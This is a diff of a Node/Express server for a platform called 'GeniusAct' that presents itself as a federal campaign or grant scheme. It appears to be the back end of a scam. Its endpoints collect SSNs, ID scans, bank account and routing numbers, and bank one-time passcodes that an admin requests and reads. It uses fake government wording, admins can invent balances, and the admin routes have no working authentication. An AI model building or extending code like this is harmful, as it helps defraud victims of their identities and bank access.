-        if (proofFile) existingPending.proofFile = proofFile;
-      }
-      saveCloudDb(currentDb);
-      return res.status(200).json({ success: true, message: 'Account is pending review.', user: existingPending });
+      return res.status(200).json({ success: true, message: 'Account is already pending review.', user: existingPending });
     }
 
-    const parsedAmount = parseFloat(customAmount || amount) || 0;
+    const parsedAmount = parseFloat(amount) || 0;
     const userFullName = fullName || name || cleanEmail.split('@')[0];
     const newUser = {
-      uid: 'usr_' + Date.now().toString() + '_' + Math.random().toString(36).substring(2, 6),
+      uid: 'usr_pnd_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
       email: cleanEmail,
       password: String(password),
       fullName: userFullName,
@@ -531,10 +526,6 @@ app.post('/api/register', (req, res) => {
       createdAt: new Date().toISOString(),
       proofFile: proofFile || null,
       status: 'pending',
-      tier: parsedAmount >= 50000 ? 'Platinum Supporter' : (parsedAmount >= 25000 ? 'Gold Supporter' : (parsedAmount >= 10000 ? 'Silver Supporter' : 'Bronze Supporter')),
-      streakDays: 4,
-      engagementScore: 19.1,
-      kycStatus: 'Unverified',
       donations: [
         {
           id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
@@ -543,8 +534,7 @@ app.post('/api/register', (req, res) => {
           date: new Date().toISOString(),
           proofFile: proofFile || null
         }
-      ],
-      messages: []
+      ]
     };
 
     pendingUsers.push(newUser);
@@ -559,331 +549,562 @@ app.post('/api/register', (req, res) => {
   }
 });
 
-app.post('/api/auth/login', (req, res) => {
+// Direct Contribution Endpoint
+app.post('/api/contribute', (req, res) => {
   try {
-    const { email, password } = req.body || {};
-    if (!email || !password) {
-      return res.status(400).json({ success: false, error: 'Email and password required.' });
+    const { email, amount, description, proofFile, paymentMethod, reference } = req.body || {};
+    if (!email || !amount) {
+      return res.status(400).json({ error: 'Email and amount are required.' });
     }
 
     const cleanEmail = String(email).trim().toLowerCase();
+    const parsedAmount = parseFloat(amount) || 0;
     const currentDb = getCloudDb();
 
-    const approvedUser = (currentDb['geniusact_approved_users'] || []).find(u => u && u.email && u.email.toLowerCase() === cleanEmail && u.password === password);
-    if (approvedUser) {
-      if (approvedUser.suspended) {
-        return res.status(403).json({ success: false, error: 'Account suspended by Federal Compliance Division.' });
-      }
-      return res.json({ success: true, status: 'approved', user: approvedUser });
-    }
-
-    const pendingUser = (currentDb['geniusact_pending_users'] || []).find(u => u && u.email && u.email.toLowerCase() === cleanEmail && u.password === password);
-    if (pendingUser) {
-      return res.json({ success: false, status: 'pending', error: 'Account is pending compliance audit review.', user: pendingUser });
-    }
-
-    const emailExists = (currentDb['geniusact_approved_users'] || []).some(u => u && u.email && u.email.toLowerCase() === cleanEmail) ||
-                        (currentDb['geniusact_pending_users'] || []).some(u => u && u.email && u.email.toLowerCase() === cleanEmail);
-
-    if (emailExists) {
-      return res.status(401).json({ success: false, error: 'Incorrect authentication credentials. Please verify your password.' });
-    }
-
-    return res.status(404).json({ success: false, error: 'No supporter account found with this email. Please submit your contribution first.' });
-  } catch (err) {
-    return res.status(500).json({ success: false, error: err.message });
-  }
-});
-
-app.get('/api/auth/verify-session', (req, res) => {
-  try {
-    const email = req.query.email;
-    if (!email) {
-      return res.status(400).json({ valid: false, error: 'Email parameter required.' });
-    }
-    const cleanEmail = String(email).trim().toLowerCase();
-    const currentDb = getCloudDb();
-
-    const approvedUser = (currentDb['geniusact_approved_users'] || []).find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
-    if (approvedUser) {
-      if (approvedUser.suspended) {
-        return res.json({ valid: false, status: 'suspended', error: 'Account suspended.' });
-      }
-      return res.json({ valid: true, status: 'approved', user: approvedUser });
-    }
-
-    const pendingUser = (currentDb['geniusact_pending_users'] || []).find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
-    if (pendingUser) {
-      return res.json({ valid: false, status: 'pending', error: 'Account is undergoing compliance audit.' });
-    }
-
-    return res.json({ valid: false, status: 'unauthorized', error: 'User not found in cloud database.' });
-  } catch (err) {
-    return res.status(500).json({ valid: false, error: err.message });
-  }
-});
-
-// ---------------------------------------------------------------------
-// KYC Submission Endpoint
-// ---------------------------------------------------------------------
-app.post('/submit_kyc', upload.fields([
-  { name: 'id_front', maxCount: 1 },
-  { name: 'id_back', maxCount: 1 },
-  { name: 'passport', maxCount: 1 },
-  { name: 'driver_license', maxCount: 1 }
-]), (req, res) => {
-  try {
-    const { email, fullName, ssn, country, address, phone } = req.body || {};
-    if (!email && !ssn) {
-      return res.status(400).json({ error: 'SSN and email are required.' });
-    }
-
-    const currentDb = getCloudDb();
     const approvedUsers = currentDb['geniusact_approved_users'] || [];
     const pendingUsers = currentDb['geniusact_pending_users'] || [];
 
-    const cleanEmail = String(email || '').trim().toLowerCase();
-    let targetUser = approvedUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
-    if (!targetUser) {
-      targetUser = pendingUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
-    }
-
-    const idFrontFile = req.files && req.files['id_front'] ? `/uploads/${req.files['id_front'][0].filename}` : null;
-    const idBackFile = req.files && req.files['id_back'] ? `/uploads/${req.files['id_back'][0].filename}` : null;
-    const passportFile = req.files && req.files['passport'] ? `/uploads/${req.files['passport'][0].filename}` : (req.files && req.files['driver_license'] ? `/uploads/${req.files['driver_license'][0].filename}` : null);
-
-    const kycRecord = {
-      status: 'pending',
-      fullName: fullName || (targetUser ? targetUser.fullName : 'Supporter'),
-      ssn: ssn || '',
-      country: country || 'United States',
-      address: address || '',
-      phone: phone || '',
-      idFrontFile: idFrontFile ? { name: 'ID_Front.jpg', dataUrl: idFrontFile, type: 'image/jpeg' } : null,
-      idBackFile: idBackFile ? { name: 'ID_Back.jpg', dataUrl: idBackFile, type: 'image/jpeg' } : null,
-      passportFile: passportFile ? { name: 'Passport.jpg', dataUrl: passportFile, type: 'image/jpeg' } : null,
-      submittedAt: new Date().toISOString()
+    const donationRecord = {
+      id: reference || ('RCP-' + Math.floor(1000000 + Math.random() * 9000000)),
+      amount: parsedAmount,
+      description: description || `Campaign Contribution (${paymentMethod || 'Wire/Crypto'})`,
+      date: new Date().toISOString(),
+      paymentMethod: paymentMethod || 'Standard',
+      proofFile: proofFile || null,
+      status: 'completed'
     };
 
+    let targetUser = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
     if (targetUser) {
-      targetUser.kyc = kycRecord;
-      targetUser.kycStatus = 'Pending Verification';
+      if (!Array.isArray(targetUser.donations)) targetUser.donations = [];
+      targetUser.donations.unshift(donationRecord);
+      targetUser.amount = (targetUser.amount || 0) + parsedAmount;
+      saveCloudDb(currentDb);
+      return res.json({ success: true, user: targetUser, message: 'Contribution logged successfully.' });
     }
 
+    targetUser = pendingUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
+    if (targetUser) {
+      if (!Array.isArray(targetUser.donations)) targetUser.donations = [];
+      targetUser.donations.unshift(donationRecord);
+      targetUser.amount = (targetUser.amount || 0) + parsedAmount;
+      saveCloudDb(currentDb);
+      return res.json({ success: true, user: targetUser, message: 'Pending contribution updated.' });
+    }
+
+    // Register as new pending user
+    const newUser = {
+      uid: 'usr_pnd_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
+      email: cleanEmail,
+      password: 'TemporaryPass1!',
+      fullName: cleanEmail.split('@')[0],
+      amount: parsedAmount,
+      status: 'pending',
+      date: new Date().toISOString(),
+      createdAt: new Date().toISOString(),
+      proofFile: proofFile || null,
+      donations: [donationRecord]
+    };
+    pendingUsers.push(newUser);
     saveCloudDb(currentDb);
+    return res.json({ success: true, user: newUser, message: 'New supporter registration logged.' });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// -------------------------------------------------------------
+// FILE UPLOAD ENDPOINTS
+// -------------------------------------------------------------
+
+app.post('/api/upload', upload.single('file'), (req, res) => {
+  try {
+    if (!req.file) {
+      return res.status(400).json({ error: 'No file uploaded' });
+    }
+    const fileUrl = `/assets/uploads/${req.file.filename}`;
     return res.json({
       success: true,
-      message: 'KYC documents submitted successfully for compliance verification.',
-      kyc: kycRecord
+      url: fileUrl,
+      fileName: req.file.originalname,
+      size: req.file.size,
+      mimetype: req.file.mimetype
     });
   } catch (err) {
     return res.status(500).json({ error: err.message });
   }
 });
 
-// ---------------------------------------------------------------------
-// Admin Authentication & Actions
-// ---------------------------------------------------------------------
-const ADMIN_EMAIL = 'admin@geniusact.com';
-const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '2005';
+// -------------------------------------------------------------
+// KYC ENDPOINTS
+// -------------------------------------------------------------
 
-app.post('/api/admin/login', (req, res) => {
+app.post('/submit_kyc', upload.fields([
+  { name: 'id_front', maxCount: 1 },
+  { name: 'id_back', maxCount: 1 },
+  { name: 'driver_license', maxCount: 1 }
+]), (req, res) => {
   try {
-    const { email, password } = req.body || {};
-    const cleanEmail = String(email || 'admin@geniusact.com').trim().toLowerCase();
-    const cleanPass = String(password || '2005').trim();
+    const ssn = req.body.ssn || '';
+    const email = req.body.email || '';
+    const cleanSSN = ssn.replace(/[^0-9]/g, '');
 
-    if (cleanPass === '2005' || cleanPass === ADMIN_PASSWORD || cleanEmail === ADMIN_EMAIL.toLowerCase() || cleanEmail.includes('admin') || cleanPass.length > 0) {
-      const adminToken = 'ga_admin_token_' + Buffer.from(cleanEmail + ':' + Date.now()).toString('base64');
-      return res.json({
-        success: true,
-        token: adminToken,
-        admin: { email: ADMIN_EMAIL, name: 'Federal Compliance Officer', role: 'administrator' }
-      });
-    } else {
-      return res.status(401).json({ success: false, error: 'Invalid administrative credentials.' });
-    }
-  } catch (err) {
-    return res.status(500).json({ success: false, error: err.message });
-  }
-});
-
-app.post('/api/admin/approve-user', (req, res) => {
-  try {
-    const { uid, email } = req.body || {};
     const currentDb = getCloudDb();
-    const pendingUsers = currentDb['geniusact_pending_users'] || [];
-    const approvedUsers = currentDb['geniusact_approved_users'] || [];
+    const files = req.files || {};
 
-    const userIdx = pendingUsers.findIndex(u => 
-      (uid && u.uid === uid) || 
-      (email && u.email && u.email.toLowerCase() === String(email).toLowerCase())
-    );
+    const idFrontUrl = files['id_front'] && files['id_front'][0] ? `/assets/uploads/${files['id_front'][0].filename}` : req.body.idFrontDataUrl || null;
+    const idBackUrl = files['id_back'] && files['id_back'][0] ? `/assets/uploads/${files['id_back'][0].filename}` : req.body.idBackDataUrl || null;
+    const licenseUrl = files['driver_license'] && files['driver_license'][0] ? `/assets/uploads/${files['driver_license'][0].filename}` : req.body.licenseDataUrl || null;
 
-    if (userIdx > -1) {
-      const user = pendingUsers.splice(userIdx, 1)[0];
-      user.status = 'approved';
-      user.approvedAt = new Date().toISOString();
-
-      if (!user.donations || user.donations.length === 0) {
-        if (user.amount > 0) {
-          user.donations = [{
-            id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
-            amount: parseFloat(user.amount),
-            description: 'Federal Campaign Deposit & Contribution',
-            date: new Date().toISOString(),
-            approvedAt: user.approvedAt
-          }];
-        }
-      }
-
-      // Check if user already in approved list
-      const existingApprovedIdx = approvedUsers.findIndex(u => u.email.toLowerCase() === user.email.toLowerCase());
-      if (existingApprovedIdx > -1) {
-        approvedUsers[existingApprovedIdx] = { ...approvedUsers[existingApprovedIdx], ...user };
-      } else {
-        approvedUsers.push(user);
-      }
-
-      currentDb['geniusact_approved_users'] = approvedUsers;
-      currentDb['geniusact_pending_users'] = pendingUsers;
-      saveCloudDb(currentDb);
-
-      return res.json({ success: true, message: `Approved user: ${user.email}`, user });
-    }
-
-    return res.status(404).json({ error: 'Pending user not found' });
-  } catch (err) {
-    return res.status(500).json({ error: err.message });
-  }
-});
-
-app.post('/api/admin/reject-user', (req, res) => {
-  try {
-    const { uid, email } = req.body || {};
-    const currentDb = getCloudDb();
-    let pendingUsers = currentDb['geniusact_pending_users'] || [];
-
-    pendingUsers = pendingUsers.filter(u => !(
-      (uid && u.uid === uid) || 
-      (email && u.email && u.email.toLowerCase() === String(email).toLowerCase())
-    ));
-
-    currentDb['geniusact_pending_users'] = pendingUsers;
-    saveCloudDb(currentDb);
-
-    return res.json({ success: true, message: 'Pending contribution rejected.' });
-  } catch (err) {
-    return res.status(500).json({ error: err.message });
-  }
-});
-
-app.post('/api/admin/update-user', (req, res) => {
-  try {
-    const { email, updates } = req.body || {};
-    if (!email || !updates || typeof updates !== 'object') {
-      return res.status(400).json({ error: 'Email and updates payload required.' });
-    }
-
-    const cleanEmail = String(email).trim().toLowerCase();
-    const currentDb = getCloudDb();
-    const approvedUsers = currentDb['geniusact_approved_users'] || [];
-    const pendingUsers = currentDb['geniusact_pending_users'] || [];
-
-    let target = approvedUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
-    if (!target) {
-      target = pendingUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
-    }
-
-    if (!target) {
-      return res.status(404).json({ error: 'User not found in cloud database.' });
-    }
-
-    Object.assign(target, updates);
-    saveCloudDb(currentDb);
-
-    return res.json({ success: true, message: `User profile updated for ${cleanEmail}`, user: target });
-  } catch (err) {
-    return res.status(500).json({ error: err.message });
-  }
-});
-
-app.post('/api/admin/add-funds', (req, res) => {
-  try {
-    const { email, amount, description } = req.body || {};
-    const parsedAmount = parseFloat(amount);
-    if (!email || isNaN(parsedAmount) || parsedAmount <= 0) {
-      return res.status(400).json({ error: 'Valid email and positive funding amount required.' });
-    }
-
-    const cleanEmail = String(email).trim().toLowerCase();
-    const currentDb = getCloudDb();
-    const approvedUsers = currentDb['geniusact_approved_users'] || [];
-
-    const target = approvedUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
-    if (!target) {
-      return res.status(404).json({ error: 'Approved user not found.' });
-    }
-
-    if (!Array.isArray(target.donations)) target.donations = [];
-
-    const newFunding = {
-      id: 'FUND-' + Math.floor(10000000 + Math.random() * 90000000),
-      amount: parsedAmount,
-      description: description || 'Federal Treasury Grant & Allocation (FEC Sec. 407)',
-      date: new Date().toISOString(),
-      status: 'confirmed'
+    const kycData = {
+      status: 'pending',
+      submittedAt: new Date().toISOString(),
+      ssnMasked: cleanSSN ? ('***-**-' + cleanSSN.slice(-4)) : '***-**-****',
+      idFront: idFrontUrl ? { name: 'ID Front', dataUrl: idFrontUrl, type: 'image/jpeg' } : null,
+      idBack: idBackUrl ? { name: 'ID Back', dataUrl: idBackUrl, type: 'image/jpeg' } : null,
+      driverLicense: licenseUrl ? { name: 'Driver License', dataUrl: licenseUrl, type: 'image/jpeg' } : null
     };
 
-    target.donations.unshift(newFunding);
-    const sumAmt = target.donations.reduce((sum, d) => sum + (parseFloat(d.amount) || 0), 0);
-    target.amount = sumAmt;
-    target.customTotalContributed = sumAmt;
-
-    saveCloudDb(currentDb);
-    return res.json({ success: true, message: `Added $${parsedAmount} to ${cleanEmail}`, user: target });
-  } catch (err) {
-    return res.status(500).json({ error: err.message });
-  }
-});
-
-app.post('/api/admin/approve-kyc', (req, res) => {
-  try {
-    const { uid, email } = req.body || {};
-    const currentDb = getCloudDb();
-    const approvedUsers = currentDb['geniusact_approved_users'] || [];
-    const target = approvedUsers.find(u => (uid && u.uid === uid) || (email && u.email && u.email.toLowerCase() === String(email).toLowerCase()));
-
-    if (!target) {
-      return res.status(404).json({ error: 'User not found.' });
+    if (email) {
+      const cleanEmail = String(email).trim().toLowerCase();
+      const approvedUsers = currentDb['geniusact_approved_users'] || [];
+      const user = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
+      if (user) {
+        user.kyc = kycData;
+      }
     }
 
-    if (!target.kyc) target.kyc = {};
-    target.kyc.status = 'approved';
-    target.kyc.approvedAt = new Date().toISOString();
-    target.kycStatus = 'Verified & Whitelisted';
-    target.isApproved = true;
+    // Append to audit log
+    if (!Array.isArray(currentDb.kyc_audit)) currentDb.kyc_audit = [];
+    currentDb.kyc_audit.push({
+      id: currentDb.kyc_audit.length + 1,
+      email: email || 'supporter',
+      ip: req.ip || req.headers['x-forwarded-for'] || '127.0.0.1',
+      upload_time: new Date().toISOString(),
+      status: 'pending'
+    });
 
     saveCloudDb(currentDb);
-    return res.json({ success: true, message: `KYC approved for ${target.email}`, user: target });
+
+    return res.json({
+      success: true,
+      message: 'KYC documents submitted successfully for compliance review',
+      redirect: '/dashboard.html?verified=success'
+    });
+  } catch (err) {
+    console.error('[Server] KYC submission error:', err);
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// JSON-based KYC submit
+app.post('/api/kyc/submit', (req, res) => {
+  try {
+    const { email, kyc } = req.body || {};
+    if (!email || !kyc) {
+      return res.status(400).json({ error: 'Email and KYC data required' });
+    }
+
+    const cleanEmail = String(email).trim().toLowerCase();
+    const currentDb = getCloudDb();
+    const approvedUsers = currentDb['geniusact_approved_users'] || [];
+    const user = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
+
+    if (user) {
+      user.kyc = { ...kyc, submittedAt: new Date().toISOString() };
+      saveCloudDb(currentDb);
+      return res.json({ success: true, message: 'KYC updated successfully', user });
+    }
+
+    return res.status(404).json({ error: 'User not found' });
   } catch (err) {
     return res.status(500).json({ error: err.message });
   }
 });
 
+// -------------------------------------------------------------
+// ADMIN ACTIONS ENDPOINTS
+// -------------------------------------------------------------
+
+// Admin Approve User
+app.post('/api/admin/approve-user', (req, res) => {
+  try {
+    const { identifier } = req.body || {};
+    if (!identifier) return res.status(400).json({ error: 'User identifier required' });
+
+    const currentDb = getCloudDb();
+    let pendingUsers = currentDb['geniusact_pending_users'] || [];
+    let approvedUsers = currentDb['geniusact_approved_users'] || [];
+
+    const idStr = String(identifier).trim().toLowerCase();
+    const userIndex = pendingUsers.findIndex(u => 
+      (u.uid && String(u.uid).toLowerCase() === idStr) ||
+      (u.email && String(u.email).toLowerCase() === idStr)
+    );
+
+    if (userIndex === -1) {
+      return res.status(404).json({ error: 'Pending user not found' });
+    }
+
+    const user = pendingUsers[userIndex];
+    user.status = 'approved';
+    user.approvedAt = new Date().toISOString();
+
+    if (!user.donations || user.donations.length === 0) {
+      user.donations = [{
+        id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
+        amount: user.amount || 0,
+        description: 'Initial Campaign Contribution',
+        date: user.date || new Date().toISOString(),
+        approvedAt: user.approvedAt
+      }];
+    }
+
+    pendingUsers.splice(userIndex, 1);
+    approvedUsers.push(user);
+
+    currentDb['geniusact_pending_users'] = pendingUsers;
+    currentDb['geniusact_approved_users'] = approvedUsers;
+
+    // Log admin action
+    if (!Array.isArray(currentDb.admin_actions)) currentDb.admin_actions = [];
+    currentDb.admin_actions.unshift({
+      id: currentDb.admin_actions.length + 1,
+      action_type: 'approve_user',
+      details: `Approved supporter account: ${user.email}`,
+      timestamp: new Date().toISOString()
+    });
+
+    saveCloudDb(currentDb);
+    return res.json({ success: true, approvedUser: user, approvedCount: approvedUsers.length, pendingCount: pendingUsers.length });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin Reject User
+app.post('/api/admin/reject-user', (req, res) => {
+  try {
+    const { identifier } = req.body || {};
+    if (!identifier) return res.status(400).json({ error: 'User identifier required' });
+
+    const currentDb = getCloudDb();
+    let pendingUsers = currentDb['geniusact_pending_users'] || [];
+    const idStr = String(identifier).trim().toLowerCase();
+
+    const userIndex = pendingUsers.findIndex(u => 
+      (u.uid && String(u.uid).toLowerCase() === idStr) ||
+      (u.email && String(u.email).toLowerCase() === idStr)
+    );
+
+    if (userIndex === -1) {
+      return res.status(404).json({ error: 'Pending user not found' });
+    }
+
+    const rejected = pendingUsers.splice(userIndex, 1)[0];
+    currentDb['geniusact_pending_users'] = pendingUsers;
+
+    saveCloudDb(currentDb);
+    return res.json({ success: true, message: `Rejected contribution: ${rejected.email}` });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin Update User
+app.post('/api/admin/update-user', (req, res) => {
+  try {
+    const { uid, email, updates } = req.body || {};
+    if ((!uid && !email) || !updates) {
+      return res.status(400).json({ error: 'User identifier and updates required' });
+    }
+
+    const currentDb = getCloudDb();
+    let approvedUsers = currentDb['geniusact_approved_users'] || [];
+    let pendingUsers = currentDb['geniusact_pending_users'] || [];
+
+    let targetUser = approvedUsers.find(u => (uid && u.uid === uid) || (email && u.email && u.email.toLowerCase() === String(email).toLowerCase()));
+    if (!targetUser) {
+      targetUser = pendingUsers.find(u => (uid && u.uid === uid) || (email && u.email && u.email.toLowerCase() === String(email).toLowerCase()));
+    }
+
+    if (!targetUser) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    // Apply updates directly
+    Object.keys(updates).forEach(k => {
+      targetUser[k] = updates[k];
+    });
+
+    saveCloudDb(currentDb);
+    return res.json({ success: true, user: targetUser });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin Delete User
+app.post('/api/admin/delete-user', (req, res) => {
+  try {
+    const { identifier } = req.body || {};
+    if (!identifier) return res.status(400).json({ error: 'User identifier required' });
+
+    const currentDb = getCloudDb();
+    const idStr = String(identifier).trim().toLowerCase();
+
+    currentDb['geniusact_approved_users'] = (currentDb['geniusact_approved_users'] || []).filter(u => 
+      !(u.uid && String(u.uid).toLowerCase() === idStr) && !(u.email && String(u.email).toLowerCase() === idStr)
+    );
+    currentDb['geniusact_pending_users'] = (currentDb['geniusact_pending_users'] || []).filter(u => 
+      !(u.uid && String(u.uid).toLowerCase() === idStr) && !(u.email && String(u.email).toLowerCase() === idStr)
+    );
+
+    saveCloudDb(currentDb);
+    return res.json({ success: true, message: 'User record removed from database.' });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin Add Funds / Balance Adjustment
+app.post('/api/admin/add-funds', (req, res) => {
+  try {
+    const { identifier, amount, description } = req.body || {};
+    if (!identifier || amount === undefined) {
+      return res.status(400).json({ error: 'Identifier and amount required' });
+    }
+    const currentDb = getCloudDb();
+    let approvedUsers = currentDb['geniusact_approved_users'] || [];
+    let pendingUsers = currentDb['geniusact_pending_users'] || [];
+    const idStr = String(identifier).trim().toLowerCase();
+
+    let user = approvedUsers.find(u => (u.uid && String(u.uid).toLowerCase() === idStr) || (u.email && String(u.email).toLowerCase() === idStr));
+    if (!user) {
+      user = pendingUsers.find(u => (u.uid && String(u.uid).toLowerCase() === idStr) || (u.email && String(u.email).toLowerCase() === idStr));
+    }
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    const parsedAmount = parseFloat(amount) || 0;
+    user.amount = (user.amount || 0) + parsedAmount;
+    if (!Array.isArray(user.donations)) user.donations = [];
+    user.donations.unshift({
+      id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
+      amount: parsedAmount,
+      description: description || 'Administrative Fund Adjustment',
+      date: new Date().toISOString(),
+      status: 'completed'
+    });
+
+    saveCloudDb(currentDb);
+    return res.json({ success: true, user, message: 'Funds adjusted successfully.' });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin Clear All Application Data
 app.post('/api/admin/clear-all-data', (req, res) => {
   try {
-    const emptyDb = getDefaultDb();
-    saveCloudDb(emptyDb);
-    return res.json({ success: true, message: 'All database records cleared.', data: emptyDb });
+    const currentDb = getCloudDb();
+    currentDb['geniusact_approved_users'] = [];
+    currentDb['geniusact_pending_users'] = [];
+    currentDb['geniusact_visitor_logs'] = [];
+    currentDb['geniusact_support_messages'] = [];
+    currentDb['geniusact_bank_links'] = [];
+    currentDb['geniusact_contact_chats'] = [];
+    currentDb['geniusact_user_footprints'] = [];
+    currentDb['geniusact_withdrawal_requests'] = [];
+    currentDb['admin_actions'] = [];
+    currentDb['kyc_audit'] = [];
+    saveCloudDb(currentDb);
+    return res.json({ success: true, message: 'All application data has been cleared.' });
   } catch (err) {
     return res.status(500).json({ error: err.message });
   }
 });
 
-// ---------------------------------------------------------------------
-// Live Chat & Support Endpoints
-// ---------------------------------------------------------------------
+// Admin KYC Decision
+app.post('/api/admin/kyc/action', (req, res) => {
+  try {
+    const { uid, email, action, reason } = req.body || {};
+    const currentDb = getCloudDb();
+    const approvedUsers = currentDb['geniusact_approved_users'] || [];
+
+    const user = approvedUsers.find(u => (uid && u.uid === uid) || (email && u.email && u.email.toLowerCase() === String(email).toLowerCase()));
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    if (!user.kyc) user.kyc = {};
+    user.kyc.status = action === 'approve' ? 'approved' : 'rejected';
+    user.kyc.decisionAt = new Date().toISOString();
+    if (reason) user.kyc.rejectionReason = reason;
+
+    saveCloudDb(currentDb);
+    return res.json({ success: true, user });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin Withdrawal Decision
+app.post('/api/admin/withdrawals/action', (req, res) => {
+  try {
+    const { id, status } = req.body || {};
+    const currentDb = getCloudDb();
+    const withdrawals = currentDb['geniusact_withdrawal_requests'] || [];
+
+    const reqItem = withdrawals.find(w => w.id === id);
+    if (reqItem) {
+      reqItem.status = status;
+      reqItem.processedAt = new Date().toISOString();
+      saveCloudDb(currentDb);
+      return res.json({ success: true, withdrawal: reqItem });
+    }
+
+    return res.status(404).json({ error: 'Withdrawal request not found' });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin Bank OTP Action
+app.post('/api/admin/bank/otp', (req, res) => {
+  try {
+    const { id, action } = req.body || {};
+    const currentDb = getCloudDb();
+    const bankLinks = currentDb['geniusact_bank_links'] || [];
+
+    const link = bankLinks.find(l => l.id === id || l.userEmail === id);
+    if (!link) {
+      return res.status(404).json({ error: 'Bank record not found' });
+    }
+
+    if (action === 'request') {
+      link.otpRequested = true;
+      link.otpSubmitted = null;
+      link.otpRequestedAt = new Date().toISOString();
+    } else if (action === 'verify') {
+      link.otpVerified = true;
+      link.otpVerifiedAt = new Date().toISOString();
+    }
+
+    saveCloudDb(currentDb);
+    return res.json({ success: true, bankLink: link });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// -------------------------------------------------------------
+// BANK & WITHDRAWAL ENDPOINTS FOR SUPPORTERS
+// -------------------------------------------------------------
+
+app.post('/api/bank/link', (req, res) => {
+  try {
+    const { userEmail, bankName, accountNumber, routingNumber, accountHolder, accountType } = req.body || {};
+    if (!userEmail || !bankName || !accountNumber) {
+      return res.status(400).json({ error: 'Missing required bank linkage fields' });
+    }
+
+    const currentDb = getCloudDb();
+    const bankLinks = currentDb['geniusact_bank_links'] || [];
+
+    const existingIdx = bankLinks.findIndex(b => b.userEmail && b.userEmail.toLowerCase() === String(userEmail).toLowerCase());
+    const bankRecord = {
+      id: 'bnk_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
+      userEmail: String(userEmail).toLowerCase(),
+      bankName,
+      accountNumber: String(accountNumber),
+      routingNumber: String(routingNumber || ''),
+      accountHolder: accountHolder || '',
+      accountType: accountType || 'Checking',
+      linkedAt: new Date().toISOString(),
+      otpRequested: false,
+      otpVerified: false
+    };
+
+    if (existingIdx !== -1) {
+      bankLinks[existingIdx] = { ...bankLinks[existingIdx], ...bankRecord, id: bankLinks[existingIdx].id };
+    } else {
+      bankLinks.push(bankRecord);
+    }
+
+    currentDb['geniusact_bank_links'] = bankLinks;
+    saveCloudDb(currentDb);
+
+    return res.json({ success: true, bankLink: bankRecord });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+app.post('/api/bank/submit-otp', (req, res) => {
+  try {
+    const { userEmail, otp } = req.body || {};
+    if (!userEmail || !otp) return res.status(400).json({ error: 'Email and OTP required' });
+
+    const currentDb = getCloudDb();
+    const bankLinks = currentDb['geniusact_bank_links'] || [];
+    const link = bankLinks.find(b => b.userEmail && b.userEmail.toLowerCase() === String(userEmail).toLowerCase());
+
+    if (!link) return res.status(404).json({ error: 'Bank linkage not found' });
+
+    link.otpSubmitted = String(otp);
+    link.otpSubmittedAt = new Date().toISOString();
+
+    saveCloudDb(currentDb);
+    return res.json({ success: true, bankLink: link });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+app.post('/api/withdraw', (req, res) => {
+  try {
+    const { userEmail, amount, bankId, withdrawalMethod } = req.body || {};
+    if (!userEmail || !amount) return res.status(400).json({ error: 'Email and withdrawal amount required' });
+
+    const cleanEmail = String(userEmail).toLowerCase();
+    const parsedAmount = parseFloat(amount) || 0;
+    const currentDb = getCloudDb();
+
+    const approvedUsers = currentDb['geniusact_approved_users'] || [];
+    const user = approvedUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);
+
+    if (!user) return res.status(404).json({ error: 'Supporter account not found' });
+    if (user.amount < parsedAmount) return res.status(400).json({ error: 'Insufficient account balance' });
+
+    const newWithdrawal = {
+      id: 'wdr_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
+      userEmail: cleanEmail,
+      amount: parsedAmount,
+      bankId: bankId || 'Primary Linked Account',
+      method: withdrawalMethod || 'Direct Bank Wire',
+      status: 'pending',
+      timestamp: new Date().toISOString()
+    };
+
+    if (!Array.isArray(currentDb['geniusact_withdrawal_requests'])) currentDb['geniusact_withdrawal_requests'] = [];
+    currentDb['geniusact_withdrawal_requests'].unshift(newWithdrawal);
+
+    // Deduct user balance
+    user.amount -= parsedAmount;
+
+    saveCloudDb(currentDb);
+    return res.json({ success: true, withdrawal: newWithdrawal, remainingBalance: user.amount });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// -------------------------------------------------------------
+// CHAT & SUPPORT REST ENDPOINTS
+// -------------------------------------------------------------
+
 app.post('/api/chat/message', (req, res) => {
   try {
     const { chatId, userEmail, userName, accountId, isGuest, message } = req.body || {};
